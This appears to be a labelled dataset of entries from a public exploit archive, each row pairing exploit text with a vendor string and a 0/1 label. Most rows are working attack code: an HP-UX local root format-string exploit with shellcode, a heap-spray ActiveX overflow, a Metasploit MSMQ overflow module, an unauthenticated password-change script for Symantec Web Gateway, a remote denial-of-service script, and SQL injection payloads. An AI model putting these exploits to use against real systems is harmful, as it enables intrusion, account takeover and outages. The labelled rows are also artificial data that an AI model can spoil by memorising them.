36922,"vPhoto-Album 4.2 iOS - Local File Inclusion Document Title: =============== vPhoto-Album v4.2 iOS - File Include Web Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1477   Release Date: ============= 2015-05-05   Vulnerability Laboratory ID (VL-ID): ==================================== 1477   Common Vulnerability Scoring System: ==================================== 6.2   Product & Service Introduction: =============================== vPhoto Pro is your side of the most powerful local album management software that allows you to easily manage your massive photos,  while giving you an unprecedented user experience. No in-app purchase, no functional limitations.  (Copy of the Homepage:  https://itunes.apple.com/us/app/veryphoto-album-password-wifi/id720810114 )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research team discovered a local file include web vulnerability in the official vPhoto-Album v4.2 iOS mobile web-application.   Vulnerability Disclosure Timeline: ================================== 2015-05-05: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Cheng Chen Product: vPhoto-Album - iOS Web Application (Wifi) 4.1   Exploitation Technique: ======================= Remote   Severity Level: =============== High   Technical Details & Description: ================================ A local file include web vulnerability has been discovered in the official vPhoto-Album v4.2 iOS mobile web-application. The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system  specific path commands to compromise the mobile web-application.  The vulnerability is located in the `name` value of the wifi interface module. Local attackers are able to manipulate the  wifi web interface by usage of the vulnerable sync function.  The sync does not encode or parse the context of the albumname.  Local attacker are able to manipulate the input of the folder path value to exploit the issue by web-application sync.  The execution of unauthorized local file or path request occurs in the index file dir listing module of the wifi web-application. The request method to inject is a sync and the attack vector is located on the application-side of the affected service.  The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 7.1.  Exploitation of the file include web vulnerability requires no user interaction or privileged web-application user account. Successful exploitation  of the local file include web vulnerability results in mobile application or connected device component compromise.  Vulnerable Method(s): 				[+] [Sync]  Vulnerable Module(s): 				[+] Albumname  Vulnerable Parameter(s): 				[+] name  Affected Module(s): 				[+] File Dir Index   Proof of Concept (PoC): ======================= The local file include web vulnerability can be exploited by local attackers with restricted physical device access and no user interaction. For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.   PoC: http://localhost:8080/  <script type=""text/javascript"">             var albumArray = getAllAlbum();             var numberOfAlbums = getNumberOfAlbums();             for (var i=0; i<numberOfAlbums; i=i+4)             {                 document.write(""<tr>"");                                  document.write(""<td height=\""170\"" width=\""150\"">"");                 if (i+0 < numberOfAlbums)                 {                     document.write(""<p align=\""center\""><img border=\""0\"" src=\""getCoverImage?""+encodeURI(JSON.stringify(albumArray[i+0]))+""\"" width=\""170\"" height=\""150\"" onclick=albumClick('""+(i+0)+""')>"");                 }                 document.write(""</td>"");                                  document.write(""<td height=\""170\"" width=\""50\""></td>"");                                  document.write(""<td height=\""170\"" width=\""150\"">"");                 if (i+1 < numberOfAlbums)                 {                     document.write(""<p align=\""center\""><img border=\""0\"" src=\""getCoverImage?""+encodeURI(JSON.stringify(albumArray[i+1]))+""\"" width=\""170\"" height=\""150\"" onclick=albumClick('""+(i+1)+""')>"");                 }                 document.write(""</td>"");                                  document.write(""<td height=\""170\"" width=\""50\""></td>"");                                  document.write(""<td height=\""170\"" width=\""150\"">"");                 if (i+2 < numberOfAlbums)                 {                     document.write(""<p align=\""center\""><img border=\""0\"" src=\""getCoverImage?""+encodeURI(JSON.stringify(albumArray[i+2]))+""\"" width=\""170\"" height=\""150\"" onclick=albumClick('""+(i+2)+""')>"");                 }                 document.write(""</td>"");                                  document.write(""<td height=\""170\"" width=\""50\""></td>"");                                  document.write(""<td height=\""170\"" width=\""150\"">"");                 if (i+3 < numberOfAlbums)                 {                     document.write(""<p align=\""center\""><img border=\""0\"" src=\""getCoverImage?""+encodeURI(JSON.stringify(albumArray[i+3]))+""\"" width=\""170\"" height=\""150\"" onclick=albumClick('""+(i+3)+""')>"");                 }                 document.write(""</td>"");                                  document.write(""</tr>"");                                                   document.write(""<tr>"");                                  document.write(""<td height=\""20\"" > <p align=\""center\"">"");                 if (i+0 < numberOfAlbums)                 {                                          document.write(""<font face=\""Courier New\"" size=\""2\"">"");                     document.write(albumArray[i+0].name+""(""+albumArray[i+0].numberOfImage+"")"");                     document.write(""</font>"");                 }                 document.write(""</td>"");                                  document.write(""<td height=\""20\"" width=\""50\""></td>"");                                  document.write(""<td height=\""20\"" > <p align=\""center\"">"");                 if (i+1 < numberOfAlbums)                 {                                       document.write(""<font face=\""Courier New\"" size=\""2\"">"");                     document.write(albumArray[i+1].name+""(""+albumArray[i+1].numberOfImage+"")"");                     document.write(""</font>"");                 }                 document.write(""</td>"");                                  document.write(""<td height=\""20\"" width=\""50\""></td>"");                                  document.write(""<td height=\""20\"" > <p align=\""center\"">"");                 if (i+2 < numberOfAlbums)                 {                                          document.write(""<font face=\""Courier New\"" size=\""2\"">"");                     document.write(albumArray[i+2].name+""(""+albumArray[i+2].numberOfImage+"")"");                     document.write(""</font>"");                 }                 document.write(""</td>"");                                  document.write(""<td height=\""20\"" width=\""50\""></td>"");                                                   document.write(""<td height=\""20\"" > <p align=\""center\"">"");                 if (i+3 < numberOfAlbums)                 {                                          document.write(""<font face=\""Courier New\"" size=\""2\"">"");                     document.write(albumArray[i+3].name+""(""+albumArray[i+3].numberOfImage+"")"");                     document.write(""</font>"");                 }                 document.write(""</td>"");                                  document.write(""</tr>"");                                                   document.write(""<tr>"");                                  document.write(""<td height=\""20\"" colspan=\""7\"">""); document.write(""</td>"");                                  document.write(""</tr>"");             } 			 </script> <tr><td height=""170"" width=""150""><p align=""center""><img src=""getCoverImage?%7B%22name%22:%22%5C%22%3E%3C[FILE INCLUDE VULNERABILITY!]%3E%22,%22type%22:%222%22,%22groupType%22:2,%22url%22:%22assets-library://group/?id=B94CC6C9-FB2C-4BFD-8BA4-0925E51146A1&filter=1537%22,%22numberOfImage%22:%222%22%7D"" onclick=""albumClick('0')"" border=""0"" height=""150"" width=""170""></p></td><td height=""170"" width=""50""></td><td height=""170"" width=""150""><p align=""center""><img src=""getCoverImage?%7B%22name%22:%22Camera%20Roll%22,%22type%22:%222%22,%22groupType%22:16,%22url%22:%22assets-library://group/?id=70169F06-36C7-430C-AA4F-55B95E268426%22,%22numberOfImage%22:%222%22%7D"" onclick=""albumClick('1')"" border=""0"" height=""150"" width=""170""></p></td><td height=""170"" width=""50""></td><td height=""170"" width=""150""></td><td height=""170"" width=""50""></td><td height=""170"" width=""150""></td></tr><tr><td height=""20""> <p align=""center""><font face=""Courier New"" size=""2"">""><C[FILE INCLUDE VULNERABILITY!]>(2)</font></td><td height=""20"" width=""50""></td><td height=""20"" > <p align=""center""><font face=""Courier New"" size=""2"">Camera Roll(2)</font></td><td height=""20"" width=""50""></td><td height=""20"" > <p align=""center""></td><td height=""20"" width=""50""></td><td height=""20"" > <p align=""center""></td></tr><tr><td height=""20"" colspan=""7""></td></tr>	 </table> </div> </body> </html></iframe></font></p></td></tr></tbody>   Reference(s): http://localhost:8080/   Security Risk: ============== The security riskof the local file include web vulnerability in the album values is estimated as high. (CVSS 6.2)   Credits & Authors: ================== Vulnerability Laboratory [Research Team]  - Katharin S. L. (CH) (research@vulnerability-lab.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed  or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable  in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab  or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for  consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses,  policies, deface websites, hack into databases or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to  electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website  is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact  (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™    --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt",.vulnerability-lab.,0
41569,"WordPress Plugin PICA Photo Gallery 1.0 - SQL Injection # # # # #  # Exploit Title: WordPress Plugin PICA Photo Gallery v1.0 - SQL Injection # Google Dork: N/A # Date: 09.03.2017 # Vendor Homepage: https://www.apptha.com/ # Software: https://www.apptha.com/category/extension/Wordpress/PICA-Photo-Gallery # Demo: http://www.apptha.com/demo/pica-photo-gallery # Version: 1.0 # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/?aid=[SQL] # For example; # -3+/*!50000union*/+select+0x496873616e2053656e63616e3c62723e7777772e696873616e2e6e6574,2,3,@@version--+- # wpapptha_term_relationships,wpapptha_term_taxonomy,wpapptha_terms,wpapptha_usermeta,wpapptha_users # Etc.. # # # # #",.apptha.,0
17287,"Winamp 5.61 - 'in_midi' Component heap Overflow (crash only) # Exploit Title: Winamp 'in_midi' component heap overflow # Date: 05/14/2011 # Author: Alexander Gavrun (http://0x1byte.blogspot.com/) # Software Link: http://www.winamp.com/ # Version: 5.61 # Tested on: Windows 7  Vulnerability occur while parsing midi file with special crafted System Exclusive message type (event).  System exclusive message type, according with midi specification (http://www.gweep.net/~prefect/eng/reference/protocol/midispec.html), begins with 0xF0 and ends with 0xF7 byte (after the data bytes). Processing of this message type begins in sub_766410F function (dissasembled in_midi.dll of winamp v.5.61).  ; ..... .text:0766414D loc_766414D:                            ; CODE XREF: sub_766410F+36 j .text:0766414D                 add     ebx, eax .text:0766414F                 lea     esi, [ebx+edi] .text:07664152                 mov     al, [esi]  ; esi points to message begin .text:07664154                 mov     [ebp+var_C], ebx .text:07664157                 cmp     al, 0FFh   ; is first byte equal to 0xFF? .text:07664159                 jnz     loc_7664328 ; .....  .text:07664328 loc_7664328:                            ; CODE XREF: sub_766410F+4A j .text:07664328                 mov     edx, 0F0h .text:0766432D                 mov     cl, al .text:0766432F                 and     cl, dl .text:07664331                 cmp     cl, dl .text:07664333                 jnz     short loc_7664398   .text:07664335                 cmp     al, dl .text:07664337                 jnz     short loc_766438E ; is first byte equal 0xF0 (is SysEx message type?)? .text:07664339                 mov     eax, [ebp+arg_8] .text:0766433C                 mov     edi, [ebp+var_8] .text:0766433F                 sub     eax, ebx .text:07664341                 push    eax .text:07664342                 mov     ecx, esi .text:07664344                 mov     [ebp+var_10], edi .text:07664347                 call    sub_766D702 .text:0766434C                 pop     ecx .text:0766434D                 mov     ecx, [ebp+arg_10] .text:07664350                 add     edi, ecx .text:07664352                 push    edi .text:07664353                 push    eax ; SysEx message size, calculated by sub_766D702 .text:07664354                 push    esi .text:07664355                 mov     esi, [ebp+arg_0] .text:07664358                 mov     edi, [esi+30h] .text:0766435B                 mov     [ebp+var_24], eax .text:0766435E                 call    sub_766D894  sub_766D702 function search for 0xF7 byte and count a size of SysEx message. Searching starts from 3rd byte and it means that minimal value, which function might return is 3.  ; ..... .text:0766D702 sub_766D702     proc near     .text:0766D702                 push    ebp .text:0766D703                 mov     ebp, esp .text:0766D705                 xor     eax, eax .text:0766D707                 inc     eax     ; eax = 1 .text:0766D708                 cmp     [ebp+arg_0], eax ; arg_0 - MTrk chunk size (readed from midi file) .text:0766D70B                 jle     short loc_766D719 ; jump is not taken .text:0766D70D .text:0766D70D loc_766D70D:                            ; CODE XREF: sub_766D702+15 j .text:0766D70D                 inc     eax     ; eax = 2 .text:0766D70E                 cmp     byte ptr [eax+ecx], 0F7h ; check for 0xF7 byte .text:0766D712                 jz      short loc_766D731 .text:0766D714                 cmp     eax, [ebp+arg_0] .text:0766D717                 jl      short loc_766D70D ; ..... .text:0766D731 loc_766D731:                            ; CODE XREF: sub_766D702+10 j .text:0766D731                 inc     eax ; eax = 3 (minimal value that this function might return) .text:0766D732                 pop     ebp .text:0766D733                 retn ; .....  In sub_766D894 check the size of early allocated buffer and reallocate it, if necessary. Then to this buffer copy data of the SysEx message with size obtained by subtraction of offset (to data begin) from SysEx message size.  .text:0766D894 sub_766D894     proc near               ; CODE XREF: sub_766410F+24F p .text:0766D894 ; ..... .text:0766D8DC loc_766D8DC:                            ; CODE XREF: sub_766D894+29 j .text:0766D8DC                 mov     eax, [edi] .text:0766D8DE                 push    ebx .text:0766D8DF                 mov     ebx, [edi+14h] .text:0766D8E2                 add     ebx, [ebp+arg_4] .text:0766D8E5                 cmp     ebx, eax  ; ebx - SysEx massage size, eax - allocated earlier buffer size .text:0766D8E7                 jb      short loc_766D900  ; jump is taken (to trigger vuln. SysEx message size must be small). ; ..... .text:0766D900 loc_766D900:                            ; CODE XREF: sub_766D894+53 j .text:0766D900                 mov     eax, [edi+14h] .text:0766D903                 mov     ecx, [edi+0Ch] .text:0766D906                 mov     byte ptr [eax+ecx], 0F0h .text:0766D90A                 mov     eax, [ebp+arg_0] .text:0766D90D                 inc     eax .text:0766D90E                 push    0FFFFFFFFh .text:0766D910                 push    eax  ; eax - pointer to start of SysEx message plus one .text:0766D911                 lea     esi, [ebp+var_4] .text:0766D914                 call    sub_766D734 ; .....  sub_766D734 function calculates offset to data begins by passing all negative values follow by first byte (0xF0).  .text:0766D734 sub_766D734     proc near              ; ..... .text:0766D734                 xor     eax, eax .text:0766D736                 xor     ecx, ecx .text:0766D738                 push    edi .text:0766D739 .text:0766D739 loc_766D739:                            ; CODE XREF: sub_766D734+20 j .text:0766D739                 cmp     eax, [esp+4+arg_4] ; arg_4 = 0xFFFFFFFF, eax = 0 .text:0766D73D                 jnb     short loc_766D75A ; jump is not taken .text:0766D73F                 mov     edx, [esp+4+arg_0] .text:0766D743                 mov     dl, [eax+edx]  ; store byte to dl .text:0766D746                 movzx   edi, dl .text:0766D749                 and     edi, 7Fh .text:0766D74C                 shl     ecx, 7 .text:0766D74F                 inc     eax   ; counter .text:0766D750                 or      ecx, edi .text:0766D752                 test    dl, dl .text:0766D754                 js      short loc_766D739 ; is stored byte less zero? .text:0766D756                 mov     [esi], ecx .text:0766D758                 pop     edi .text:0766D759                 retn .text:0766D75A ; --------------------------------------------------------------------------- .text:0766D75A .text:0766D75A loc_766D75A:                            ; CODE XREF: sub_766D734+9 j .text:0766D75A                 and     dword ptr [esi], 0 .text:0766D75D                 pop     edi .text:0766D75E                 retn .text:0766D75E sub_766D734     endp  Then value, obtained as [SysEx message size] - [offset to data begin] - 1, passed as a Size argument to memcpy function.  ; ..... .text:0766D919                 mov     esi, [ebp+arg_4] .text:0766D91C                 sub     esi, eax .text:0766D91E                 lea     ecx, [esi-1]  ; ecx = size - offset - 1 .text:0766D921                 push    ecx             ; Size .text:0766D922                 mov     ecx, [ebp+arg_0] .text:0766D925                 mov     [ebp+var_4], eax .text:0766D928                 lea     eax, [eax+ecx+1] .text:0766D92C                 mov     ecx, [edi+0Ch] .text:0766D92F                 push    eax             ; Src .text:0766D930                 mov     eax, [edi+14h] .text:0766D933                 lea     eax, [eax+ecx+1] .text:0766D937                 push    eax             ; Dst .text:0766D938                 call    memcpy  Since 0xF7 less than zero, we can construct SysEx message so that offset will be greater (or equal) than size. For an example, the following sequence  0xF0 0xFF 0xF7 0xFF 0xFF ...[data] size = 3 and offset = 4 ecx = 3 - 4 - 1 = 0xFFFFFFFE - very big positive value. After all heap overflow will be occur.   POC file (MIME encoded): poc.mid begin TVRoZAAAAAYAAQAQAeBNVHJrAAAAIgDw//fvailable: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17287.poc.mid",winamp,1
134,"HP-UX B11.11 - '/usr/bin/ct' Format String Privilege Escalation /******************************************************************************* *  File    : x_hp-ux11i_nls_ct.c *  Usage   : cc x_hp-ux11i_nls_ct.c -o x_ct ; ./x_ct *  Purpose : Get a local rootshell from /usr/bin/ct,using HP-UX location language format string bug. *  Author  : watercloud xfocus org  *  Tested  : On HP-UX B11.11 . ******************************************************************************/   #include<stdio.h>  #define PATH ""PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin"" #define TERM ""TERM=xterm"" #define NLSPATH ""NLSPATH=/tmp/.ex.cat""  #define CMD  ""/usr/bin/ct abc_ "" #define MSG ""\$set 1\n1128 "" #define PRT_ARG_NUM 2     #define STACK_LEN 0x180    #define ENV_BEGIN 0x40    #define ENV_LEN   0x40   #define LOW_STACK 0x210    char buffer[512]; char buff[72]=   ""\x0b\x5a\x02\x9a\x34\x16\x03\xe8\x20\x20\x08\x01\xe4\x20\xe0\x08""   ""\x96\xd6\x04\x16\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22""   ""\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x70\x16""   ""/bin/shA""; int * pint = (int *) &buff[56]; unsigned int haddr = 0;       unsigned int dstaddr = 0;      int main(argc,argv,env) int argc;char ** argv;char **env; {     unsigned int * pa = (unsigned int*)env;     FILE * fp = NULL;     int xnum = (LOW_STACK - ENV_BEGIN + STACK_LEN -56 -12 -36 -PRT_ARG_NUM*4)/4;        int alig1= ENV_BEGIN - xnum*8;     int alig2=0;     int i=0;      while(*pa != NULL)             *pa++=0;          if(strlen(CMD) >ENV_BEGIN-3)     {         printf(""No enough space to alig our env!\n"");         exit(1);     }  	printf(""Exploite for HP-UX 11i NLS format bug by command ct.\n""); 	printf(""From watercloud@xfocus.org.  2003-1-4\n""); 	printf(""   Site : http://www.xfocus.net (CN).\n""); 	printf(""   Site : http://www.xfocus.org (EN).\n"");       haddr = (unsigned int)&fp & 0xffff0000;     if(alig1 < 0)       alig1+=0x10000;     alig2 = (haddr >> 16) - alig1 -xnum*8 ;     if(alig2 < 0)       alig2+=0x10000;      dstaddr= haddr+ LOW_STACK + STACK_LEN -24;       *pint++=dstaddr;     *pint++=dstaddr;     *pint++=dstaddr;     *pint = 0;          /* begin to make our .cat file */     fp = fopen(""/tmp/.ex.k"",""w"");     if(fp == NULL)     {       printf(""open file : /tmp/.ex.k for write error.\n"");       exit(1);     }     fprintf(fp,""%s"",MSG);     for(;i<xnum;i++)       fprintf(fp,""%%.8x"");     fprintf(fp,""%%.%ix%%n"",alig1);     fprintf(fp,""%%.%ix%%hn"",alig2);     fclose(fp);     fp = NULL;     system(""/usr/bin/gencat /tmp/.ex.cat /tmp/.ex.k"");     unlink(""/tmp/.ex.k"");       sprintf(buffer,""TZ=%*s%s%*s"",ENV_BEGIN-3-strlen(CMD),""A"",buff,ENV_BEGIN+ENV_LEN-strlen(buff),""B"");     putenv(buffer);     putenv(PATH);     putenv(TERM);     putenv(NLSPATH);          printf(""¼ÇµÃÉ¾³ýÕâ¸öÁÙÊ±ÎÄ¼þ(Remember to delete the  file): /tmp/.ex.cat .\n"");     execl(""/usr/bin/ct"",""/usr/bin/ct"",""abc_"",0);   /* ºÃÏ·¿ªÊ¼ÁË £º£©  */ }    // milw0rm.com [2003-12-16]",hp,1
8310,"Sami HTTP Server 2.x - 'HEAD' Remote Denial of Service #!/usr/bin/perl # # Sami HTTP Server v2.x Remote Denial of Service with (HEAD) request. # # -------------------------------------------------------------------- # The vulnerability is caused due to an error in handling the HEAD # command. This can be exploited to crash the HTTP service. # -------------------------------------------------------------------- # # Author: Jonathan Salwan # Mail: submit [AT] shell-storm.org # Web: http://www.shell-storm.org   use IO::Socket; print ""[+] Author : Jonathan Salwan\n""; print ""[+] Soft   : Sami HTTP Server v2.x Remote DoS\n"";  	if (@ARGV < 1) 		{  		print ""[-] Usage: <file.pl> <host> <port>\n"";  		print ""[-] Exemple: file.pl 127.0.0.1 80\n"";  		exit; 		}   	$ip 	= $ARGV[0]; 	$port 	= $ARGV[1];  print ""[+] Sending request...\n"";  $socket = IO::Socket::INET->new( Proto => ""tcp"", PeerAddr => ""$ip"", PeerPort => ""$port"") || die ""[-]Connexion FAILED!\n"";  	print $socket ""HEAD /\x25 HTTP/1.0\r\n"";  close($socket);  print ""[+]Done!\n"";  # milw0rm.com [2009-03-30]",.shell-storm.,1
27328,"D3Jeeb Pro 3 - 'catogary.php?catid' SQL Injection source: https://www.securityfocus.com/bid/16853/info   D3Jeeb is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.    Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/catogary.php?catid=[SQL]",D3Jeeb,1
20707,"Symantec Web Gateway 5.0.3.18 - Arbitrary Password Change #!/usr/bin/python  import urllib import urllib2 import re import sys  print ""[*] ###########################################################"" print ""[*] Symantec Web Gateway <= 5.0.3.18 Arbitrary Password Change"" print ""[*] @_Kc57"" print ""[*] ###########################################################\n""   if (len(sys.argv) != 4): 	print ""Usage: poc.py <RHOST> <username> <newpassword>"" 	exit(0)  ip = sys.argv[1] username = sys.argv[2] password = sys.argv[3]  url = ""https://%s/spywall/temppassword.php"" % (ip)  opts = { 	'target':'executive_summary.php', 	'USERNAME':username, 	'password':password, 	'password2':password, 	'Save':'Save' }  print ""[*] Sending request to server...""  data = urllib.urlencode(opts) request = urllib2.Request(url, data) response = urllib2.urlopen(request)  match = re.search('Your new password has been saved', response.read())  if(match): 	print ""[*] Password for %s changed to %s"" %(username,password) else: 	print ""[*] Password change failed!""",Symantec,1
4250,"Yahoo! Widget < 4.0.5 - 'GetComponentVersion()' Remote Overflow <html> <!-- +++++++++++++++++++++++ +Last Modified by lhoang8500++ +++++++++++++++++++++++ --> <html> <object classid=""CLSID:7EC7B6C5-25BD-4586-A641-D2ACBB6629DD"" id=""target""></OBJECT>  <SCRIPT language=""javascript"">  	var heapSprayToAddress = 0x05050505;  	var payLoadCode = unescape(""%uc931%ue983%ud9b0%ud9ee%u2474%u5bf4%u7381%u2713%uf3fc%u830c%ufceb%uf4e2%u96db%u4118%u05cf%uf30c%u9cd8%u6078%ud803%u4978%u771b%u098f%ufd5f%u871c%ue468%u5378%ufd07%u4518%uc8ac%u0d78%ucdc9%u9533%u788b%u7833%u3d20%u0139%u3e26%uf818%ua81c%u24d7%u1952%u5378%ufd03%u6a18%uf0ac%u87b8%ue078%ue7f2%ud024%u8578%ud84b%u6def%ucde4%u6828%ubfac%u87c3%uf067%u7c78%u513b%u4c78%ua22f%u829b%uf269%u5c1f%u2ad8%u5f95%u9441%u3ec0%u8b4f%u3e80%ua878%udc0c%u374f%uf01e%uac1c%uda0c%u7578%u6a16%u11a6%u0efb%u9672%uf3f1%u94f7%u052a%u51d2%uf3a4%uaff1%u5fa0%uaf74%u5fb0%uaf64%udc0c%u9441%u50e2%uaf41%ued7a%u94b2%u1657%u3b57%uf3a4%u96f1%u5de3%u0372%u6423%u5183%ue5dd%u0370%u5f25%u0372%u6423%ub5c2%u4575%u0370%u5c25%ua873%uf3a6%u6ff7%ueb9b%u3a5e%u5b8a%u2ad8%uf3a6%u9af7%u6899%u9441%u6190%u19ae%u5c99%ud57e%u853f%u96c0%u85b7%ucdc5%uff33%u028d%u21b1%ubed9%u9fdf%u86aa%ua7cb%u578c%u7e9b%u4fd9%uf3e5%ub852%uda0c%uab7c%u5da1%uad76%u0d99%uad76%u5da6%u2cd8%ua19b%uf9fe%u5f3d%u2ad8%uf399%ucbd8%udc0c%uabac%u8f0f%u98e3%uda0c%u0375%u6423%u76d7%u53f7%u0374%uf325%ufcf7%u0cf3%u0000"");  	var heapBlockSize = 0x400000;  	var payLoadSize = payLoadCode.length * 2;  	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);  	var spraySlide = unescape(""%u9090%u9090""); 	spraySlide = getSpraySlide(spraySlide,spraySlideSize);  	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;  	memory = new Array();  	for (i=0;i<heapBlocks;i++) 	{ 		memory[i] = spraySlide + payLoadCode; 	} 	function getSpraySlide(spraySlide, spraySlideSize) 	{ 		while (spraySlide.length*2<spraySlideSize) 		{ 			spraySlide += spraySlide; 		} 		spraySlide = spraySlide.substring(0,spraySlideSize/2); 		return spraySlide; 	}; var buffer =  unescape(""%u0505""); while (buffer.length < 845)  buffer+='\x0A'; while (buffer.length< 1000) buffer+=unescape(""%u0505"");  target.GetComponentVersion(buffer); </script> </html>  # milw0rm.com [2007-07-31]",Yahoo!,1
16747,"Microsoft Message Queueing Service - Path Overflow (MS05-017) (Metasploit) ## # $Id: ms05_017_msmq.rb 9262 2010-05-09 17:45:00Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::Remote::DCERPC 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Microsoft Message Queueing Service Path Overflow', 			'Description'    => %q{ 				This module exploits a stack buffer overflow in the RPC interface 				to the Microsoft Message Queueing service. The offset to the 				return address changes based on the length of the system 				hostname, so this must be provided via the 'HNAME' option. 				Much thanks to snort.org and Jean-Baptiste Marchand's 				excellent MSRPC website.  			}, 			'Author'         => [ 'hdm' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9262 $', 			'References'     => 				[ 					[ 'CVE', '2005-0059'], 					[ 'OSVDB', '15458'], 					[ 'MSB', 'MS05-017'], 					[ 'BID', '13112'], 				], 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 1024, 					'BadChars' => ""\x00\x0a\x0d\x5c\x5f\x2f\x2e\xff"", 					'StackAdjustment' => -3500,  				}, 			'Targets'        => 				[ 					[ 						'Windows 2000 ALL / Windows XP SP0-SP1 (English)', 						{ 							'Platform' => 'win', 							'Rets'     => [ 0x004014e9, 0x01001209 ] # mqsvc.exe 						}, 					], 				], 			'DisclosureDate' => 'Apr 12 2005', 			'DefaultTarget' => 0))  		# Change the default port values to point at MSMQ 		register_options( 			[ 				Opt::RPORT(2103), 				OptString.new('HNAME',  [ true,  ""The NetBIOS hostname of the target"" ]), 			], self.class) 	end  	def autofilter 		# Common vulnerability scanning tools report port 445/139 		# due to how they test for the vulnerability. Remap this 		# back to 2103 for automated exploitation  		rport = datastore['RPORT'].to_i 		if ( rport == 445 or rport == 139 ) 			datastore['RPORT'] = 2103 		end  		# The NetBIOS hostname is required to exploit this bug reliably. 		if (not datastore['HNAME']) 			# XXX automatically determine the hostname 			return false 		end  		true 	end  	def exploit  		# MSMQ supports three forms of queue names, the two we can use are 		# the IP address and the hostname. If we use the IP address via the 		# TCP: format, the offset to the SEH frame will change depending on 		# the length of the real hostname. For this reason, we force the user 		# to supply us with the actual hostname.  		# Formats: DIRECT=TCP:IPAddress\QueueName DIRECT=OS:ComputerName\QueueName  		queue_name = ""OS:#{datastore['HNAME']}""; 		queue_hlen = datastore['HNAME'].length * 2 		queue_path = unicode(queue_name + ""\\PRIVATE$\\"")  		buf   = rand_text_english(4000, payload_badchars)  		# Windows 2000 SEH offset goes first 		buf[372 - queue_hlen + 0, 4] = [ target['Rets'][0] ].pack('V') 		buf[372 - queue_hlen - 4, 2] = ""\xeb\x22""  		# Windows XP SEH offset goes second 		seh = generate_seh_payload(target['Rets'][1]) 		buf[400 - queue_hlen - 4, seh.length] = seh  		# Append the path to the location and null terminate it 		queue_path << buf << ""\x00\x00""  		# Get the unicode length of this string 		queue_plen = queue_path.length / 2  		connect 		print_status(""Trying target #{target.name}..."")  		handle = dcerpc_handle('fdb3a030-065f-11d1-bb9b-00a024ea5525', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']]) 		print_status(""Binding to #{handle} ..."") 		dcerpc_bind(handle) 		print_status(""Bound to #{handle} ..."")  		stubdata = 			NDR.long(1) + 			NDR.long(1) + 			NDR.long(1) + 			NDR.long(3) + 			NDR.long(3) + 			NDR.long(2) + 			NDR.UnicodeConformantVaryingStringPreBuilt(queue_path)  		print_status('Sending exploit ...')  		response = dcerpc.call(9, stubdata)  		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil) 			case dcerpc.last_response.stub_data 				when ""\x20\x00\x0e\xc0"" 					print_status(""The server rejected our request, the HNAME parameter could be incorrect"") 				when ""\x1e\x00\x0e\xc0"" 					print_status(""The server does not appear to be exploitable"") 				else 					print_status(""An unknown response was received from the server:"") 					print_status("">> "" + dcerpc.last_response.stub_data.unpack(""H*"")[0]) 			end 		end  		handler 		disconnect 	end  end",Microsoft,1
